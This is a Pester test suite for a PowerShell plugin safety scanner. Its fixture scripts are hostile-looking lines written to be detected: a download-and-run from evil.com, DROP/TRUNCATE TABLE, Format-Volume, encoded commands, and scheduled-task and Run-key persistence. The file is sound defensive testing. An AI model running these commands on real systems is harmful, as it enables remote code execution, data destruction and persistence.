BeforeAll {
    $repoRoot = (Resolve-Path (Join-Path $PSScriptRoot "../../..")).Path
    Import-Module (Join-Path $repoRoot "core/modules/Aira.Common.psm1") -Force -WarningAction SilentlyContinue
    Import-Module (Join-Path $repoRoot "core/modules/Aira.Validation.psm1") -Force -WarningAction SilentlyContinue

    # Create a temp workspace to simulate plugins and scripts
    $tempRoot = Join-Path ([System.IO.Path]::GetTempPath()) "aira_pkg_safety_$([guid]::NewGuid().ToString('N').Substring(0,8))"
    New-Item -ItemType Directory -Path (Join-Path $tempRoot "plugins") -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $tempRoot "core/scripts") -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $tempRoot "core/modules") -Force | Out-Null
}

AfterAll {
    if ($tempRoot -and (Test-Path $tempRoot)) {
        Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ──────────────────────────────────────────────
# Live audit against the real workspace
# ──────────────────────────────────────────────
Describe "Invoke-AiraPackageSafetyAudit - real workspace" {
    It "runs successfully and returns a valid result object" {
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $repoRoot
        $result | Should -Not -BeNullOrEmpty
        $result.name | Should -Be "package_safety"
        $result.status | Should -BeIn @("Pass", "Warn", "Fail")
        $result.summary.plugins_scanned | Should -BeGreaterOrEqual 1
        $result.summary.files_scanned | Should -BeGreaterThan 0
    }

    It "reports by_severity counts" {
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $repoRoot
        $result.summary.by_severity.critical | Should -BeOfType [int]
        $result.summary.by_severity.high | Should -BeOfType [int]
        $result.summary.by_severity.medium | Should -BeOfType [int]
        $result.summary.by_severity.low | Should -BeOfType [int]
    }
}

# ──────────────────────────────────────────────
# Manifest validation
# ──────────────────────────────────────────────
Describe "Package Safety - manifest validation" {
    It "reports missing manifest.json" {
        $pluginDir = Join-Path $tempRoot "plugins/no-manifest-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        # No manifest.json
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_MANIFEST_MISSING" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "reports invalid JSON manifest" {
        $pluginDir = Join-Path $tempRoot "plugins/bad-json-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        "{ this is not valid json }" | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_MANIFEST_INVALID" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "reports missing required manifest fields" {
        $pluginDir = Join-Path $tempRoot "plugins/incomplete-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        '{ "name": "incomplete" }' | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hits = @($result.findings | Where-Object { $_.pattern_id -eq "PKG_MANIFEST_FIELD_MISSING" })
        # Should flag version, description, enabled as missing
        $hits.Count | Should -BeGreaterOrEqual 3
    }

    It "reports unknown manifest fields" {
        $pluginDir = Join-Path $tempRoot "plugins/unknown-fields-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        @{
            name        = "suspicious"
            version     = "1.0.0"
            description = "Test"
            enabled     = $true
            backdoor    = "evil-payload"
        } | ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_MANIFEST_UNKNOWN_FIELD" -and $_.matched -eq "backdoor" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "reports missing entry_script target" {
        $pluginDir = Join-Path $tempRoot "plugins/broken-entry-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        @{
            name         = "broken-entry"
            version      = "1.0.0"
            description  = "Test"
            enabled      = $true
            entry_script = "plugins/broken-entry-plugin/scripts/nonexistent.ps1"
        } | ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_MANIFEST_ENTRY_MISSING" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "passes for a valid manifest" {
        # Clean temp - remove previous bad plugins first
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
        $pluginDir = Join-Path $tempRoot "plugins/good-plugin"
        New-Item -ItemType Directory -Path $pluginDir -Force | Out-Null
        @{
            name        = "good-plugin"
            version     = "1.0.0"
            description = "A well-formed plugin"
            enabled     = $false
        } | ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $manifestFindings = @($result.findings | Where-Object { $_.pattern_id -match "^PKG_MANIFEST" })
        $manifestFindings.Count | Should -Be 0
    }
}

# ──────────────────────────────────────────────
# Script content scanning - destructive commands
# ──────────────────────────────────────────────
Describe "Package Safety - destructive script detection" {
    BeforeEach {
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
        $pluginDir = Join-Path $tempRoot "plugins/test-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "test-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
    }

    It "detects DROP TABLE in plugin script" {
        'Write-Host "Cleaning up"; DROP TABLE users;' |
            Out-File (Join-Path $tempRoot "plugins/test-plugin/scripts/cleanup.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_SQL_DROP" }
        $hit | Should -Not -BeNullOrEmpty
        $hit.severity | Should -Be "Critical"
    }

    It "detects TRUNCATE TABLE" {
        'Invoke-SqlCmd "TRUNCATE TABLE audit_log"' |
            Out-File (Join-Path $tempRoot "plugins/test-plugin/scripts/reset.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_SQL_TRUNCATE" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "detects Format-Volume" {
        'Format-Volume -DriveLetter D -Force' |
            Out-File (Join-Path $tempRoot "plugins/test-plugin/scripts/format.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_DESTRUCT_FORMAT" }
        $hit | Should -Not -BeNullOrEmpty
    }
}

# ──────────────────────────────────────────────
# Obfuscation / code execution detection
# ──────────────────────────────────────────────
Describe "Package Safety - obfuscation and code execution" {
    BeforeEach {
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
        $pluginDir = Join-Path $tempRoot "plugins/obfusc-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "obfusc-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
    }

    It "detects -EncodedCommand" {
        'powershell -EncodedCommand SQBFAFAA' |
            Out-File (Join-Path $tempRoot "plugins/obfusc-plugin/scripts/hidden.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_ENCODED_CMD" }
        $hit | Should -Not -BeNullOrEmpty
        $hit.severity | Should -Be "Critical"
    }

    It "detects Base64 decode" {
        '$bytes = [System.Convert]::FromBase64String($encoded)' |
            Out-File (Join-Path $tempRoot "plugins/obfusc-plugin/scripts/decode.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_BASE64_DECODE" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "detects Invoke-Expression / iex" {
        '$cmd = "Get-Process"; Invoke-Expression $cmd' |
            Out-File (Join-Path $tempRoot "plugins/obfusc-plugin/scripts/iex.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_INVOKE_EXPRESSION" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "detects WebClient DownloadString" {
        '(New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1") | iex' |
            Out-File (Join-Path $tempRoot "plugins/obfusc-plugin/scripts/download.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_DOWNLOADSTRING" }
        $hit | Should -Not -BeNullOrEmpty
    }
}

# ──────────────────────────────────────────────
# Credential and sensitive data detection
# ──────────────────────────────────────────────
Describe "Package Safety - credential detection" {
    BeforeEach {
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
        $pluginDir = Join-Path $tempRoot "plugins/cred-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "cred-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
    }

    It "detects hardcoded password" {
        '$password = "SuperSecret123!"' |
            Out-File (Join-Path $tempRoot "plugins/cred-plugin/scripts/connect.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_HARDCODED_CRED" }
        $hit | Should -Not -BeNullOrEmpty
        $hit.severity | Should -Be "Critical"
    }

    It "detects hardcoded api_key" {
        '$headers = @{ api_key = "sk_live_abcdef1234567890" }' |
            Out-File (Join-Path $tempRoot "plugins/cred-plugin/scripts/api.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_HARDCODED_CRED" }
        $hit | Should -Not -BeNullOrEmpty
    }
}

# ──────────────────────────────────────────────
# Persistence / scheduled task detection
# ──────────────────────────────────────────────
Describe "Package Safety - persistence detection" {
    BeforeEach {
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
        $pluginDir = Join-Path $tempRoot "plugins/persist-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "persist-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
    }

    It "detects scheduled task creation" {
        'Register-ScheduledTask -TaskName "Evil" -Action $action' |
            Out-File (Join-Path $tempRoot "plugins/persist-plugin/scripts/persist.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_SCHTASK" }
        $hit | Should -Not -BeNullOrEmpty
    }

    It "detects startup registry modification" {
        'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "evil.exe"' |
            Out-File (Join-Path $tempRoot "plugins/persist-plugin/scripts/autorun.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_STARTUP_REG" }
        $hit | Should -Not -BeNullOrEmpty
    }
}

# ──────────────────────────────────────────────
# Severity aggregation
# ──────────────────────────────────────────────
Describe "Package Safety - severity aggregation" {
    BeforeEach {
        Get-ChildItem (Join-Path $tempRoot "plugins") -Directory | Remove-Item -Recurse -Force
    }

    It "returns Fail when Critical findings exist" {
        $pluginDir = Join-Path $tempRoot "plugins/crit-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "crit-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        'powershell -EncodedCommand SQBFAFAA' |
            Out-File (Join-Path $pluginDir "scripts/evil.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $result.status | Should -Be "Fail"
    }

    It "returns Pass for a clean workspace" {
        $pluginDir = Join-Path $tempRoot "plugins/clean-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "clean-plugin"; version = "1.0.0"; description = "A safe plugin"; enabled = $false } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        'Write-Host "Hello from clean plugin"' |
            Out-File (Join-Path $pluginDir "scripts/safe.ps1") -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $critAndHigh = @($result.findings | Where-Object { $_.severity -eq "Critical" -or $_.severity -eq "High" })
        $result.status | Should -BeIn @("Pass", "Warn")  # Warn acceptable for unsigned scripts
    }

    It "includes line numbers in findings" {
        $pluginDir = Join-Path $tempRoot "plugins/line-plugin"
        New-Item -ItemType Directory -Path (Join-Path $pluginDir "scripts") -Force | Out-Null
        @{ name = "line-plugin"; version = "1.0.0"; description = "test"; enabled = $true } |
            ConvertTo-Json | Out-File (Join-Path $pluginDir "manifest.json") -Encoding UTF8
        $lineScript = @"
# line 1 comment
# line 2 comment
Invoke-Expression `$payload
"@
        $lineScript | Out-File (Join-Path $pluginDir 'scripts/lines.ps1') -Encoding UTF8
        $result = Invoke-AiraPackageSafetyAudit -RepoRoot $tempRoot
        $hit = $result.findings | Where-Object { $_.pattern_id -eq "PKG_INVOKE_EXPRESSION" }
        $hit | Should -Not -BeNullOrEmpty
        $hit.line | Should -BeGreaterOrEqual 3
    }
}
